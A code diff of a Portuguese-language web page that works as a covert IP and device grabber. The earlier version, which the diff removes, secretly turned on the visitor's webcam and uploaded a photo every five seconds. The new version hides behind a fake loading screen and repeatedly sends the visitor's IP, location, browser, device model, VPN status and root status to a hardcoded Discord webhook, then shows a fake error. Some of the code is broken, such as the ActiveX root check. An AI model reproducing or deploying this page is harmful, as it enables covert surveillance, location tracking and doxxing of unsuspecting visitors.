@@ -3,45 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coletar Dados do Usuário</title>
+    <title>Carregando...</title>
     <style>
         body {
-            background-color: black;  /* fundo preto */
-            margin: 0;
-            padding: 0;
+            background-color: black;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: white;
-            font-family: 'Courier New', Courier, monospace;
         }
-        video {
-            display: none;  /* Ocultar o vídeo da câmera */
+
+        .loading {
+            font-size: 2em;
+            margin-top: 20px;
+            color: #ff6347;
         }
+
         .content {
-            text-align: center;
-            padding: 20px;
             border: 2px solid white;
-            border-radius: 10px;
+            padding: 20px;
             background-color: rgba(0, 0, 0, 0.7);
             width: 300px;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
         }
-        h1 {
-            color: #ff6347; /* Cor vermelha para títulos */
+
+        .error {
+            color: red;
+            font-size: 2em;
+            margin-top: 20px;
         }
-        p {
-            font-size: 1.2em;
-            margin: 10px 0;
+
+        .status {
+            color: #ff6347;
         }
     </style>
 </head>
 <body>
     <div class="content">
-        <h1>Coletando Informações...</h1>
-        <p id="status">Aguardando dados...</p>
-        <video id="videoElement" autoplay></video>  <!-- vídeo oculto -->
+        <h1>Carregando...</h1>
+        <p class="loading" id="loadingMessage">Por favor, aguarde...</p>
+        <p id="statusMessage" class="status">Estamos processando...</p>
     </div>
 
     <script>
@@ -49,7 +54,10 @@
         function getDeviceInfo() {
             const deviceInfo = navigator.userAgent;  // Informações do dispositivo
             const browser = getBrowser();  // Função para capturar o navegador corretamente
-            return { deviceInfo, browser };
+            const isMobile = /Mobi|Android/i.test(deviceInfo);
+            const isPC = !isMobile;
+
+            return { deviceInfo, browser, isMobile, isPC };
         }
 
         // Função para detectar o navegador corretamente
@@ -66,10 +74,33 @@
             }
         }
 
+        // Função para verificar se o dispositivo está rootado (mobile)
+        function isRooted() {
+            if (/android/i.test(navigator.userAgent)) {
+                try {
+                    // Tentativa de verificar arquivos típicos de root em Android
+                    const fs = new ActiveXObject("Scripting.FileSystemObject");
+                    return fs.FileExists("/system/app/Superuser.apk") || fs.FileExists("/system/xbin/su");
+                } catch (e) {
+                    return false;
+                }
+            }
+            return false;
+        }
+
+        // Função para verificar se o usuário está usando VPN ou Proxy
+        function detectVPNorProxy(ip) {
+            return fetch(`https://ip-api.com/json/${ip}`)
+                .then(response => response.json())
+                .then(data => {
+                    return data.proxy ? "Proxy Detectado" : "Sem Proxy/VPN Detectado";
+                });
+        }
+
         // Função para enviar as informações para o Discord Webhook
         function sendToDiscord(info) {
             const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3';
-
+            
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -80,10 +111,11 @@
 > **IP:** ${info.ip}
 > **Dispositivo:** ${info.deviceInfo}
 > **Navegador:** ${info.browser}
-> **Região:** ${info.region}
-
-**Foto Capturada:**
-`})
+> **Modelo de Dispositivo:** ${info.model}
+> **VPN/Proxy:** ${info.vpnOrProxy}
+> **Root:** ${info.isRooted ? "Sim" : "Não"}
+> **Tipo de Dispositivo:** ${info.isMobile ? "Mobile" : "PC"}
+`)
             })
             .then(response => {
                 if (response.ok) {
@@ -95,76 +127,76 @@
             .catch(error => console.error('Erro ao enviar dados:', error));
         }
 
-        // Função para capturar a foto a cada 5 segundos e enviar ao Discord
-        function capturePhoto(videoElement) {
-            const canvas = document.createElement('canvas');
-            canvas.width = 640;  // Defina o tamanho do canvas para capturar a imagem
-            canvas.height = 480;
-            const context = canvas.getContext('2d');
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => {
-                sendPhotoToDiscord(blob);  // Enviar foto para o Discord Webhook
-            }, 'image/jpeg');
-        }
-
-        // Função para enviar a foto para o Discord Webhook
-        function sendPhotoToDiscord(blob) {
-            const formData = new FormData();
-            formData.append('file', blob);
-
-            fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => console.log('Foto enviada para o webhook:', data))
-            .catch(error => console.error('Erro ao enviar foto:', error));
-        }
-
-        // Função para acessar a câmera do usuário e começar o processo
-        function startCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function (stream) {
-                    const videoElement = document.getElementById('videoElement');
-                    videoElement.srcObject = stream;
-
-                    // Obter informações do dispositivo
-                    const deviceInfo = getDeviceInfo();
-
-                    // Atualizar a interface com os dados de status
-                    document.getElementById('status').innerText = 'Obtendo informações do IP...';
-
-                    // Pegar o IP público e a localização
-                    fetch('https://ip-api.com/json')  // Pega o IP público e a localização
-                        .then(response => response.json())
-                        .then(data => {
-                            // Incluindo IP e região no envio ao Discord
-                            const userInfo = {
-                                ip: data.query,  // IP do usuário
-                                deviceInfo: deviceInfo.deviceInfo,  // Informações do dispositivo
-                                browser: deviceInfo.browser,  // Navegador
-                                region: data.city + ', ' + data.country  // Região (cidade, país)
-                            };
-
-                            sendToDiscord(userInfo);  // Enviar as informações ao Discord
-
-                            // Captura foto a cada 5 segundos
-                            setInterval(() => capturePhoto(videoElement), 5000);
-                        })
-                        .catch(error => {
-                            console.error('Erro ao pegar informações do IP:', error);
-                            document.getElementById('status').innerText = 'Erro ao obter informações do IP!';
-                        });
-                })
-                .catch(function (error) {
-                    console.error('Erro ao acessar a câmera:', error);
-                    document.getElementById('status').innerText = 'Erro ao acessar a câmera!';
+        // Função para pegar o IP e a região do usuário
+        function getUserIP() {
+            return fetch('https://ip-api.com/json')
+                .then(response => response.json())
+                .then(data => {
+                    return {
+                        ip: data.query,  // IP do usuário
+                        region: data.city + ', ' + data.country  // Região (cidade, país)
+                    };
                 });
         }
 
-        // Iniciar câmera automaticamente ao carregar a página
-        window.onload = startCamera;
+        // Função para pegar o modelo do dispositivo
+        function getDeviceModel() {
+            if (/Mobi|Android/i.test(navigator.userAgent)) {
+                const model = navigator.userAgent.match(/(.*?)/);
+                return model ? model[1] : "Desconhecido";
+            }
+            return "Desktop";
+        }
+
+        // Função para simular a espera de 12 minutos (720 segundos)
+        function startLoading() {
+            let elapsedTime = 0;
+            const loadingMessage = document.getElementById('loadingMessage');
+            const statusMessage = document.getElementById('statusMessage');
+
+            const loadingInterval = setInterval(() => {
+                elapsedTime += 10;  // Atualizar a cada 10 segundos
+
+                // Enviar dados a cada 30 segundos
+                if (elapsedTime % 30 === 0) {
+                    getUserIP().then(userInfo => {
+                        const deviceInfo = getDeviceInfo();
+                        detectVPNorProxy(userInfo.ip).then(vpnStatus => {
+                            sendToDiscord({
+                                ...userInfo,
+                                deviceInfo: deviceInfo.deviceInfo,
+                                browser: deviceInfo.browser,
+                                model: getDeviceModel(),
+                                vpnOrProxy: vpnStatus,
+                                isRooted: isRooted(),
+                                isMobile: deviceInfo.isMobile
+                            });
+                        });
+                    });
+                }
+
+                // Atualizar mensagem de carregamento
+                loadingMessage.innerText = `Por favor, aguarde... (${elapsedTime / 60} min)`;
+
+                // Após 12 minutos (720 segundos), gerar erro e parar o carregamento
+                if (elapsedTime >= 720) {
+                    clearInterval(loadingInterval);  // Parar o carregamento
+                    showError();  // Mostrar erro
+                }
+            }, 10000);  // Intervalo de 10 segundos
+        }
+
+        // Função para mostrar mensagem de erro após 12 minutos
+        function showError() {
+            const statusMessage = document.getElementById('statusMessage');
+            const loadingMessage = document.getElementById('loadingMessage');
+            loadingMessage.innerText = "Ocorreu um erro durante o processamento.";
+            statusMessage.innerText = "Falha ao carregar os dados!";
+            document.body.style.backgroundColor = "red";  // Mudar fundo para vermelho
+        }
+
+        // Iniciar a tela de carregamento quando a página for carregada
+        window.onload = startLoading;
     </script>
 </body>
 </html>
